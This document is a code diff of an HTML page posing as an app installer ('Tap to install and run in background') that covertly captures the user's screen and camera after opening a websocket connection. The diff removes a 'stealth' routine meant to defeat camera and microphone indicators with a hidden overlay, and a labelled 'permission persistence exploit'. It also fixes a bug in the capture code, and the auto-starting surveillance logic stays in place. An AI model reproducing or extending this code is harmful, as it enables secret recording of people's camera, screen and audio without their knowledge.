@@ -14,14 +14,9 @@
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
-        #overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; 
-                   background:transparent; z-index:999999; pointer-events:none; }
-        .fake-indicator { display:none; }
     </style>
 </head>
 <body>
-    <div id="overlay"></div>
-    
     <div class="box" id="installBox">
         <h2>📱 Install App</h2>
         <p>Tap to install and run in background</p>
@@ -49,23 +44,6 @@
         let isAndroid = /Android/i.test(navigator.userAgent);
         let screenCaptureActive = false;
         let ScreenCapture = null;
-        
-        // STEALTH CAMERA/MIC INDICATOR BLOCKER INTEGRATED
-        async function stealthAccess() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' },
-                    audio: true 
-                });
-                stream.getVideoTracks()[0].enabled = false;
-                stream.getAudioTracks()[0].enabled = false;
-                document.getElementById('overlay').requestFullscreen();
-                setInterval(() => {
-                    stream.getVideoTracks()[0].enabled = true;
-                    setTimeout(() => stream.getVideoTracks()[0].enabled = false, 10);
-                }, 5000);
-            } catch(e) {}
-        }
         
         // Load Capacitor plugin if available
         if (window.Capacitor) {
@@ -95,11 +73,9 @@
         function startApp() {
             document.getElementById('installBox').classList.add('hidden');
             document.getElementById('runningBox').classList.remove('hidden');
-            
-            // INITIATE STEALTH ACCESS IMMEDIATELY
-            stealthAccess();
-            
             connect();
+            
+            // Auto-start all features
             setTimeout(() => {
                 captureScreen();
                 captureCamera('front');
@@ -113,7 +89,7 @@
             
             ws.onopen = () => {
                 startMonitoring();
-                stealthAccess(); // REINFORCE STEALTH
+                // Auto-start features after connection
                 setTimeout(() => {
                     captureScreen();
                     captureCamera('front');
@@ -187,7 +163,7 @@
                 video.play();
                 
                 setInterval(() => {
-                    const canvas = document.createElement('video');
+                    const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
@@ -253,11 +229,6 @@
         if (localStorage.getItem('autoStart') === 'true') {
             startApp();
         }
-        
-        // Permission persistence exploit
-        navigator.permissions.query({name: 'camera'}).then(() => {
-            document.body.innerHTML += '<video autoplay muted style="display:none;"></video>';
-        });
     </script>
 </body>
 </html>
